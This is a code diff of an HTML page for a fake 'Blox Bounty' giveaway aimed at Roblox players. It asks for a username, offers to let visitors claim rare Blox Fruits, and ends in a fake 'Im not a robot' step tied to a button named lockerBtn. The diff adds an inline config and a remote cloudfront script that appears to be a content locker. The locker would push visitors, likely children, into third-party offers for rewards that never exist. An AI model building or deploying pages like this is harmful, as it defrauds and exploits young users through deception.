@@ -3,79 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Blox Fruits - Ultimate Rewards</title>
+    <title>Blox Bounty - Claim Your Fruits</title>
     <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
 </head>
 <body>
 
-    <div class="background-overlay"></div>
+    <div class="main-wrapper">
+        <div class="header">
+            <img src="assets/images/logo.png" alt="Blox Bounty Logo" class="main-logo">
+        </div>
 
-    <main class="main-container">
-        <header class="logo-header">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Blox_Fruits_Logo.png/640px-Blox_Fruits_Logo.png" alt="Blox Fruits Logo" class="game-logo">
-        </header>
-
-        <section id="step1" class="step-box fire-border active">
-            <h2>Enter Your Roblox Username</h2>
-            <p class="subtitle">We need your username to send the rewards.</p>
-            
-            <div class="input-group">
-                <input type="text" id="usernameInput" placeholder="Username..." autocomplete="off">
-                <span id="inputError" class="error-msg hidden">User not found!</span>
-            </div>
-
-            <button id="connectBtn" class="action-btn">
-                CONNECT ACCOUNT
-            </button>
-        </section>
-
-        <section id="step2" class="step-box hidden">
-            <h2>Is this you?</h2>
-            
-            <div id="loadingSpinner" class="spinner hidden"></div>
-
-            <div id="profileCard" class="profile-card hidden">
-                <div class="avatar-container fire-glow">
-                    <img id="userAvatar" src="" alt="Roblox Avatar">
+        <div id="step-login" class="card active">
+            <div class="fire-frame">
+                <h2>Enter Username</h2>
+                <div class="input-container">
+                    <input type="text" id="usernameInput" placeholder="Username..." autocomplete="off">
+                    <p id="errorText" class="error-msg hidden">User not found!</p>
                 </div>
-                <h3 id="userNameDisplay">Username</h3>
-                
-                <div class="stats-container">
-                    <div class="stat-box">
-                        <span class="stat-label">Followers</span>
-                        <span id="followersCount" class="stat-value">0</span>
-                    </div>
-                    <div class="stat-box">
-                        <span class="stat-label">Following</span>
-                        <span id="followingCount" class="stat-value">0</span>
-                    </div>
+                <div class="btn-group">
+                    <button id="cancelBtn" class="btn btn-red">CANCEL</button>
+                    <button id="connectBtn" class="btn btn-green">SUBMIT</button>
                 </div>
             </div>
+        </div>
 
-            <div class="button-group hidden" id="step2Buttons">
-                 <button id="wrongAccountBtn" class="secondary-btn">Wrong Account</button>
-                 <button id="confirmAccountBtn" class="action-btn go-btn">YES, CONTINUE</button>
+        <div id="step-fruits" class="card hidden">
+            <div class="slots-container">
+                <div class="slot fire-glow" id="slot-1">SLOT 1</div>
+                <div class="slot fire-glow" id="slot-2">SLOT 2</div>
+                <div class="slot fire-glow" id="slot-3">SLOT 3</div>
             </div>
-        </section>
-
-        <section id="step3" class="step-box hidden fire-border">
-            <h2>Final Step Required</h2>
-            <p class="subtitle">To prevent bot abuse, please complete the quick verification below to unlock your fruits.</p>
             
-            <div class="verification-block">
-                <button id="finalVerifyBtn" class="verify-btn">
-                    <span class="robot-icon">🤖</span> I'm not a robot
-                </button>
+            <button id="continueBtn" class="btn btn-green btn-full hidden">CONTINUE</button>
+
+            <div class="fruits-grid">
+                <div class="fruit-item" data-name="Kitsune"><img src="assets/images/kitsune.png"><button>CLAIM</button></div>
+                <div class="fruit-item" data-name="Leopard"><img src="assets/images/leopard.png"><button>CLAIM</button></div>
+                <div class="fruit-item" data-name="Dragon"><img src="assets/images/dragon.png"><button>CLAIM</button></div>
+                <div class="fruit-item" data-name="Dough"><img src="assets/images/dough.png"><button>CLAIM</button></div>
+                <div class="fruit-item" data-name="Venom"><img src="assets/images/venom.png"><button>CLAIM</button></div>
+                <div class="fruit-item" data-name="Buddha"><img src="assets/images/buddha.png"><button>CLAIM</button></div>
             </div>
-        </section>
+        </div>
 
-    </main>
+        <div id="step-verify" class="card hidden">
+            <div class="verify-box">
+                <p class="final-text">You are in the final stage.<br>Are you ready to Unlock?</p>
+                <div class="fire-frame-btn">
+                    <button id="lockerBtn" class="btn-verify">Im not a robot 🏴‍☠️</button>
+                </div>
+            </div>
+        </div>
+    </div>
 
-    <audio id="audioClick" src="assets/audio/click.mp3" preload="auto"></audio>
-    <audio id="audioSuccess" src="assets/audio/success.mp3" preload="auto"></audio>
-    <audio id="audioError" src="assets/audio/error.mp3" preload="auto"></audio>
+    <audio id="sndClick" src="assets/audio/click.mp3"></audio>
+    <audio id="sndError" src="assets/audio/error.mp3"></audio>
+    <audio id="sndSelect" src="assets/audio/select.mp3"></audio>
 
+    <script type="text/javascript">var PSNBB_sVt_hlKyAc={"it":4586440,"key":"a355c"};</script>
+    <script src="https://duw03nk63ml3f.cloudfront.net/24c5ab2.js"></script>
+    
     <script src="script.js"></script>
 </body>
 </html>
